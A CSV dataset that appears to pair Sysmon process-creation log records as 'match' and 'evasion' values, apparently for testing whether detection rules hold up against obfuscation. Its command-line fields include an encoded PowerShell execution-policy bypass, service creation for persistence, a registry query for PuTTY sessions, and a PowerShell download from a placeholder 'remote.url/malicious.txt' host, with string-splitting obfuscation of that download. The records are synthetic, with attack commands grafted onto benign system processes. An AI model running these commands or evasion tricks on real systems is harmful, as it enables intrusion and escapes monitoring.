Match Value,Evasion Value
"{'user': 'SYSTEM', 'hash': ['8aea9a37c1a3565a204d37c5e72ab791', '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e']}","{'user': 'SYSTEM', 'hash': ['a25c33fb549d90018dbeec40bb07d543', '472168cf54a123ba0fc585b4b5fedbb60562b81b3ada7616ce9ca77ddb5c4914']}"
"{'md5': '8aea9a37c1a3565a204d37c5e72ab791', 'sha256': '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e'}","{'md5': 'a25c33fb549d90018dbeec40bb07d543', 'sha256': '472168cf54a123ba0fc585b4b5fedbb60562b81b3ada7616ce9ca77ddb5c4914'}"
2021-02-04T22:28:55.984Z,2021-02-04T22:28:08.593Z
"{'record_id': 1269, 'task': 'Process Create (rule: ProcessCreate)', 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'event_id': 1, 'event_data': {'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'LogonGuid': '{19FC45AC-7528-601C-0000-0020E7030000}', 'LogonId': '0x3e7', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '0', 'IntegrityLevel': 'System', 'Description': 'Local Session Manager Service', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'lsm.exe'}, 'computer_name': 'CLIENT1.breach.local', 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'api': 'wineventlog', 'process': {'pid': 1524, 'thread': {'id': 1792}}}","{'api': 'wineventlog', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'event_data': {'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'Description': 'Client Server Runtime Process', 'LogonGuid': '{19FC45AC-74F9-601C-0000-0020E7030000}', 'IntegrityLevel': 'System', 'LogonId': '0x3e7', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '0', 'OriginalFileName': 'CSRSS.Exe'}, 'task': 'Process Create (rule: ProcessCreate)', 'opcode': 'Info', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'process': {'pid': 1504, 'thread': {'id': 1772}}, 'event_id': 1, 'record_id': 1203, 'computer_name': 'CLIENT1', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}}"
"{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.296Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1}","{'action': 'Process Create (rule: ProcessCreate)', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'created': '2021-02-04T22:31:06.125Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}"
"{'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'name': 'CLIENT1.breach.local', 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'name': 'CLIENT1', 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101']}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:55.984
ProcessGuid: {19FC45AC-7527-601C-0000-00102E640000}
ProcessId: 460
Image: C:\Windows\System32\lsm.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Local Session Manager Service
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: lsm.exe
CommandLine: C:\Windows\system32\lsm.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-7528-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=8AEA9A37C1A3565A204D37C5E72AB791,SHA256=939903F93FF37525A6C4B5CBA29CDEEE6D6055C42D605E80AE787F2A76F9870E
ParentProcessGuid: {19FC45AC-7527-601C-0000-001028570000}
ParentProcessId: 348
ParentImage: C:\Windows\System32\wininit.exe
ParentCommandLine: wininit.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:08.593
ProcessGuid: {19FC45AC-74F8-601C-0000-00101C530000}
ProcessId: 312
Image: C:\Windows\System32\csrss.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Client Server Runtime Process
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CSRSS.Exe
CommandLine: %%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
CurrentDirectory: C:\Windows\system32
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74F9-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=342271F6142E7C70805B8A81E1BA5F5C,SHA256=F9112B88FEC5EF10A7AEDF88DCEE61956D1FCDE7CB42197216E8265578713786
ParentProcessGuid: {19FC45AC-74F8-601C-0000-0010C6440000}
ParentProcessId: 296
ParentImage: C:\Windows\System32\smss.exe
ParentCommandLine: \SystemRoot\System32\smss.exe 00000000 0000003c "
"{'hash': {'md5': '8aea9a37c1a3565a204d37c5e72ab791', 'sha256': '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e'}, 'pid': 460, 'executable': 'C:\\Windows\\System32\\lsm.exe', 'command_line': 'powershell -exec bypass -enc JgAg > rs.txt', 'working_directory': 'C:\\Windows\\system32\\', 'args': ['C:\\Windows\\system32\\lsm.exe'], 'entity_id': '{19FC45AC-7527-601C-0000-00102E640000}', 'parent': {'pid': 348, 'executable': 'C:\\Windows\\System32\\wininit.exe', 'command_line': 'wininit.exe', 'name': 'wininit.exe', 'args': ['wininit.exe'], 'entity_id': '{19FC45AC-7527-601C-0000-001028570000}'}, 'name': 'lsm.exe'}","{'pid': 312, 'parent': {'command_line': '\\SystemRoot\\System32\\smss.exe 00000000 0000003c ', 'name': 'smss.exe', 'args': ['\\SystemRoot\\System32\\smss.exe', '00000000', '0000003c'], 'entity_id': '{19FC45AC-74F8-601C-0000-0010C6440000}', 'pid': 296, 'executable': 'C:\\Windows\\System32\\smss.exe'}, 'name': 'csrss.exe', 'entity_id': '{19FC45AC-74F8-601C-0000-00101C530000}', 'executable': 'C:\\Windows\\System32\\csrss.exe', 'command_line': 'cmd.exe /c sc \\\\localhost create ""win32times"" binPath=""cmd /c start c:\\windows\\temp\\x.bat""', 'working_directory': 'C:\\Windows\\system32', 'args': ['%%SystemRoot%%\\system32\\csrss.exe', 'ObjectDirectory=\\Windows', 'SharedSection=1024,12288,512', 'Windows=On', 'SubSystemType=Windows', 'ServerDll=basesrv,1', 'ServerDll=winsrv:UserServerDllInitialization,3', 'ServerDll=winsrv:ConServerDllInitialization,2', 'ServerDll=sxssrv,4', 'ProfileControl=Off', 'MaxRequestThreads=16'], 'hash': {'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}}"
"{'user': 'SYSTEM', 'hash': ['8aea9a37c1a3565a204d37c5e72ab791', '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e']}","{'user': 'SYSTEM', 'hash': ['342271f6142e7c70805b8a81e1ba5f5c', 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786']}"
"{'md5': '8aea9a37c1a3565a204d37c5e72ab791', 'sha256': '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e'}","{'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}"
2021-02-04T22:28:55.984Z,2021-02-05T09:07:01.695Z
"{'record_id': 1269, 'task': 'Process Create (rule: ProcessCreate)', 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'event_id': 1, 'event_data': {'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'LogonGuid': '{19FC45AC-7528-601C-0000-0020E7030000}', 'LogonId': '0x3e7', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '0', 'IntegrityLevel': 'System', 'Description': 'Local Session Manager Service', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'lsm.exe'}, 'computer_name': 'CLIENT1.breach.local', 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'api': 'wineventlog', 'process': {'pid': 1524, 'thread': {'id': 1792}}}","{'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'api': 'wineventlog', 'opcode': 'Info', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'record_id': 1688, 'version': 5, 'event_data': {'OriginalFileName': 'taskhost.exe', 'Company': 'Microsoft Corporation', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'TerminalSessionId': '0', 'LogonGuid': '{19FC45AC-76E8-601C-0000-0020E5030000}', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Description': 'Host Process for Windows Tasks', 'LogonId': '0x3e5'}, 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT3.breach.local', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1904, 'thread': {'id': 308}}}"
"{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}","{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}"
"{'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5'}","{'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251'}"
"{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.296Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1}","{'created': '2021-02-05T09:07:02.464Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}"
"{'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'name': 'CLIENT1.breach.local', 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'name': 'CLIENT3.breach.local', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103']}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:55.984
ProcessGuid: {19FC45AC-7527-601C-0000-00102E640000}
ProcessId: 460
Image: C:\Windows\System32\lsm.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Local Session Manager Service
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: lsm.exe
CommandLine: C:\Windows\system32\lsm.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-7528-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=8AEA9A37C1A3565A204D37C5E72AB791,SHA256=939903F93FF37525A6C4B5CBA29CDEEE6D6055C42D605E80AE787F2A76F9870E
ParentProcessGuid: {19FC45AC-7527-601C-0000-001028570000}
ParentProcessId: 348
ParentImage: C:\Windows\System32\wininit.exe
ParentCommandLine: wininit.exe","Process Create:
RuleName: 
UtcTime: 2021-02-05 09:07:01.695
ProcessGuid: {19FC45AC-0AB5-601D-0000-0010A89E6000}
ProcessId: 3844
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-76E8-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'hash': {'md5': '8aea9a37c1a3565a204d37c5e72ab791', 'sha256': '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e'}, 'pid': 460, 'executable': 'C:\\Windows\\System32\\lsm.exe', 'command_line': 'powershell -exec bypass -enc JgAg > rs.txt', 'working_directory': 'C:\\Windows\\system32\\', 'args': ['C:\\Windows\\system32\\lsm.exe'], 'entity_id': '{19FC45AC-7527-601C-0000-00102E640000}', 'parent': {'pid': 348, 'executable': 'C:\\Windows\\System32\\wininit.exe', 'command_line': 'wininit.exe', 'name': 'wininit.exe', 'args': ['wininit.exe'], 'entity_id': '{19FC45AC-7527-601C-0000-001028570000}'}, 'name': 'lsm.exe'}","{'name': 'taskhost.exe', 'entity_id': '{19FC45AC-0AB5-601D-0000-0010A89E6000}', 'pid': 3844, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe'}, 'command_line': 'powershell.exe -exec ""bypass"" -enc JgAg > rs.txt', 'args': ['taskhost.exe', '$(Arg0)'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}"
"{'user': 'SYSTEM', 'hash': ['8aea9a37c1a3565a204d37c5e72ab791', '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e']}","{'user': 'LOCAL SERVICE', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}"
"{'md5': '8aea9a37c1a3565a204d37c5e72ab791', 'sha256': '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e'}","{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}"
2021-02-04T22:28:55.984Z,2021-02-04T22:28:11.281Z
"{'record_id': 1269, 'task': 'Process Create (rule: ProcessCreate)', 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'event_id': 1, 'event_data': {'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'LogonGuid': '{19FC45AC-7528-601C-0000-0020E7030000}', 'LogonId': '0x3e7', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '0', 'IntegrityLevel': 'System', 'Description': 'Local Session Manager Service', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'lsm.exe'}, 'computer_name': 'CLIENT1.breach.local', 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'api': 'wineventlog', 'process': {'pid': 1524, 'thread': {'id': 1792}}}","{'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'record_id': 1220, 'computer_name': 'CLIENT1', 'opcode': 'Info', 'version': 5, 'event_data': {'LogonId': '0x3e7', 'Description': 'Host Process for Windows Services', 'TerminalSessionId': '0', 'LogonGuid': '{19FC45AC-74F9-601C-0000-0020E7030000}', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'svchost.exe', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'Company': 'Microsoft Corporation', 'IntegrityLevel': 'System'}, 'provider_name': 'Microsoft-Windows-Sysmon', 'event_id': 1, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'process': {'pid': 1504, 'thread': {'id': 1772}}, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'channel': 'Microsoft-Windows-Sysmon/Operational'}"
"{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.296Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1}","{'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'created': '2021-02-04T22:31:06.129Z'}"
"{'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'name': 'CLIENT1.breach.local', 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'name': 'CLIENT1', 'architecture': 'x86', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:55.984
ProcessGuid: {19FC45AC-7527-601C-0000-00102E640000}
ProcessId: 460
Image: C:\Windows\System32\lsm.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Local Session Manager Service
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: lsm.exe
CommandLine: C:\Windows\system32\lsm.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-7528-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=8AEA9A37C1A3565A204D37C5E72AB791,SHA256=939903F93FF37525A6C4B5CBA29CDEEE6D6055C42D605E80AE787F2A76F9870E
ParentProcessGuid: {19FC45AC-7527-601C-0000-001028570000}
ParentProcessId: 348
ParentImage: C:\Windows\System32\wininit.exe
ParentCommandLine: wininit.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:11.281
ProcessGuid: {19FC45AC-74FB-601C-0000-0010E42E0100}
ProcessId: 1368
Image: C:\Windows\System32\svchost.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\system32\svchost.exe -k ftpsvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74F9-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=54A47F6B5E09A77E61649109C6A08866,SHA256=121118A0F5E0E8C933EFD28C9901E54E42792619A8A3A6D11E1F0025A7324BC2
ParentProcessGuid: {19FC45AC-74F8-601C-0000-00109E610000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'hash': {'md5': '8aea9a37c1a3565a204d37c5e72ab791', 'sha256': '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e'}, 'pid': 460, 'executable': 'C:\\Windows\\System32\\lsm.exe', 'command_line': 'powershell -exec bypass -enc JgAg > rs.txt', 'working_directory': 'C:\\Windows\\system32\\', 'args': ['C:\\Windows\\system32\\lsm.exe'], 'entity_id': '{19FC45AC-7527-601C-0000-00102E640000}', 'parent': {'pid': 348, 'executable': 'C:\\Windows\\System32\\wininit.exe', 'command_line': 'wininit.exe', 'name': 'wininit.exe', 'args': ['wininit.exe'], 'entity_id': '{19FC45AC-7527-601C-0000-001028570000}'}, 'name': 'lsm.exe'}","{'entity_id': '{19FC45AC-74FB-601C-0000-0010E42E0100}', 'command_line': 'cmd.exe /c reg query ""HKEY_CURRENT_USER\\Software\\user\\PuTTY\\Sessions\\""', 'name': 'svchost.exe', 'args': ['C:\\Windows\\system32\\svchost.exe', '-k', 'ftpsvc'], 'pid': 1368, 'executable': 'C:\\Windows\\System32\\svchost.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-74F8-601C-0000-00109E610000}'}, 'hash': {'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}}"
"{'user': 'SYSTEM', 'hash': ['8aea9a37c1a3565a204d37c5e72ab791', '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e']}","{'user': 'SYSTEM', 'hash': ['54a47f6b5e09a77e61649109c6a08866', '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2']}"
"{'md5': '8aea9a37c1a3565a204d37c5e72ab791', 'sha256': '939903f93ff37525a6c4b5cba29cdeee6d6055c42d605e80ae787f2a76f9870e'}","{'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2', 'md5': '54a47f6b5e09a77e61649109c6a08866'}"
2021-02-04T22:28:15.312Z,2021-02-04T20:34:49.227Z
"{'entity_id': '{19FC45AC-74FF-601C-0000-00109F860200}', 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'reader_sl.exe', 'pid': 2076, 'command_line': 'powershell.exe -C (New-Object System.Net.Webclient).DownloadFile(remote.url/malicious.txt, output.txt)', 'parent': {'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-74FE-601C-0000-0010D8530200}', 'pid': 1572, 'executable': 'C:\\Windows\\explorer.exe'}, 'args': ['C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe'], 'hash': {'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}}","{'name': 'rundll32.exe', 'hash': {'md5': '51138beea3e2c21ec44d0932c71762a8', 'sha256': '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124'}, 'entity_id': '{19FC45AC-5A69-601C-0000-001089681000}', 'working_directory': 'C:\\ProgramData\\winlogbeat\\logs\\', 'parent': {'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-53AF-601C-0000-0010E7660300}', 'pid': 1876}, 'args': ['C:\\Windows\\system32\\rundll32.exe', 'C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL', 'C:\\ProgramData\\winlogbeat\\logs\\winlogbeat'], 'pid': 3212, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'command_line': 'powershell.exe -C (N""e""w-Object     System.""Net"".Web""cli""ent).""Download""File(remote.url/malicious.txt, output.txt)'}"
"{'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}","{'md5': '51138beea3e2c21ec44d0932c71762a8', 'sha256': '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124'}"
